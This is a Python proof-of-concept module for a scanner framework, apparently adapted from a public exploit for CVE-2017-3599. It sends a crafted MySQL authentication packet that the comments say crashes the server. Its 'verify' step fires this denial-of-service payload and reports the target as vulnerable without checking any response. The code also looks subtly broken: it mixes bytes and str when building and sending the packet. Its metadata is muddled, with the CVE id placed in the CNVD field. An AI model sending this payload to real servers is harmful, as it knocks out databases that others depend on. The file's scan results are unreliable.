# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import socket
import sys
from struct import pack
import urllib.parse
import time


class Vuln(ABVuln):
    vuln_id = 'MySQL_0001'  # 平台漏洞编号，留空
    name = 'MySQL < 5.6.35 / < 5.7.17 - Integer Overflow'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2016-12-06'  # 漏洞公布时间
    desc = '''
    Vulnerability in the MySQL Server component of Oracle MySQL (subcomponent: Server: Pluggable Auth). Supported versions that are affected are 5.6.35 and earlier and 5.7.17 and earlier. 
    Easily "exploitable" vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise MySQL Server. 
    Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server.
    CVSS 3.0 Base Score 7.5 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H).
    NOTE: the previous information is from the April 2017 CPU. Oracle has not commented on third-party claims that this issue is an integer overflow in sql/auth/sql_authentication.cc which allows remote attackers to cause a denial of service via a crafted authentication packet.
    '''  # 漏洞描述
    ref = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-3599'  # 漏洞来源
    cnvd_id = 'CVE-2017-3599'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MySQL'  # 漏洞应用名称
    product_version = '< 5.6.35 / < 5.7.17'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '43118ea7-b29d-42aa-a687-8f25f17181b9'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            '''
            CVE-2017-3599 Proof of Concept exploit code.
            https://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos/
            Rodrigo Marcos
            https://www.exploit-db.com/exploits/41954/


            if len(sys.argv)<2:
                print "Usage: python " + sys.argv[0] + " host [port]"
                exit(0)
            else:
                HOST = sys.argv[1]
                if len(sys.argv)>2:
                    PORT = int(sys.argv[2]) # Yes, no error checking... living on the wild side!
                else:
                    PORT = 3306
            print "[+] Creating packet..."


            3 bytes     Packet lenth
            1 bytes     Packet number

            Login request:
            Packet format (when the server is 4.1 or newer):
            Bytes       Content
            -----       ----
            4           client capabilities
            4           max packet size
            1           charset number
            23          reserved (always 0)
            n           user name, \0-terminated
            n           plugin auth data (e.g. scramble), length encoded
            n           database name, \0-terminated
                        (if CLIENT_CONNECT_WITH_DB is set in the capabilities)
            n           client auth plugin name - \0-terminated string,
                        (if CLIENT_PLUGIN_AUTH is set in the capabilities)

            '''

            # packet_len = '\x64\x00\x00'
            packet_num = '\x01'
            # Login request packet
            packet_cap = '\x85\xa2\xbf\x01'     # client capabilities (default)
            packet_max = '\x00\x00\x00\x01'     # max packet size (default)
            packet_cset = '\x21'                # charset (default)
            # 23 bytes reserved with nulls (default)
            p_reserved = '\x00' * 23
            # username null terminated (default)
            packet_usr = 'test\x00'

            packet_auth = '\xff'           # both \xff and \xfe crash the server

            '''
            Conditions to crash:

            1 - packet_auth must start with \xff or \xfe
            2 - packet_auth must be shorter than 8 chars

            The expected value is the password, which could be of two different formats
            (null terminated or length encoded) depending on the client functionality.
            '''

            packet = packet_cap + packet_max + packet_cset + \
                p_reserved + packet_usr + packet_auth
            packet_len = pack('i', len(packet))[:3]
            request = packet_len + packet_num + packet

            o = urllib.parse.urlparse(self.target)
            HOST = o.hostname
            PORT = o.port
            # print "[+] Connecting to host..."
            try:
                timeout = 20
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((HOST, PORT))
                print("[+] Connected.")

            except:
                print(("[+] Unable to connect to host " +
                       HOST + " on port " + str(PORT) + "."))
                s.close()
                # print "[+] Exiting."
                exit(0)

            # print "[+] Receiving greeting from remote host..."
            data = s.recv(1024)
            # print "[+] Done."

            # print "[+] Sending our payload..."
            s.send(request)
            # print "[+] Done."
            # print "Our data: %r" % request
            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                target=self.target, name=self.vuln.name))
            s.close()

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
